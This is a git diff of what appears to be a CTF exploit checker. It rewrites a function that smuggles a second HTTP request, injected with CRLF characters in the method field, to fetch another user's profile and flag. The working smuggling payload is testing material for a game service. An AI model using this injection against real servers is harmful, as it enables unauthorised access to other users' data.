@@ -1,5 +1,5 @@
 import asyncio
-from http3 import do_post, do_get
+from http3 import do_post, do_get, do_request
 import json
 
 from logging import LoggerAdapter
@@ -145,8 +145,9 @@ async def exploit_simple_smugling(task: ExploitCheckerTaskMessage, logger: Logge
 
     await do_register(task, logger, username, password)
     token = await do_login(task, logger, username, password)
-    path = (b"/ HTTP/1.1\r\nHost: localhost\r\n\r\nGET /user/" + username_to_hack.encode()).decode()
-    status, headers, body = await do_get(task.address, PORT, path,{"x-token":token})
+    method = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\nGET"
+    path = f"/user/{username_to_hack}"
+    status, headers, body = await do_request(task.address, PORT, method, path, {"x-token":token}, None)
     assert_status_code(logger, path, status, headers, body, code=200)
 
     return searcher.search_flag(body)
